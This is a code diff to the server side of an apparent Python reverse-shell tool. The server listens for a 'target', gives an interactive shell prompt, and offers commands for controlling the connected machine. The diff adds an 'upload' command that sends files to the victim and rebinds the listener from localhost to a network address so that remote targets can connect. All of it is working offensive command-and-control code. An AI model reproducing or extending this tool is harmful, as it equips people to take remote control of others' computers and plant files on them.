@@ -16,6 +16,10 @@ def reliable_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
 
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    target.send(f.read())
+
 def target_communication():
     while True:
         command = input('* Shell~%s: '% str(ip))
@@ -26,6 +30,8 @@ def target_communication():
             os.system('clear')
         elif command[:3] == 'cd ':
             pass
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
         elif command == 'help':
             print(termcolor.colored('''\n
             quit                                --> Quit session with the target
@@ -42,7 +48,7 @@ def target_communication():
             print(result)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('127.0.0.1', 5555))
+sock.bind(('192.168.2.111', 5555))
 print(termcolor.colored('[+] Listening for the incoming connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
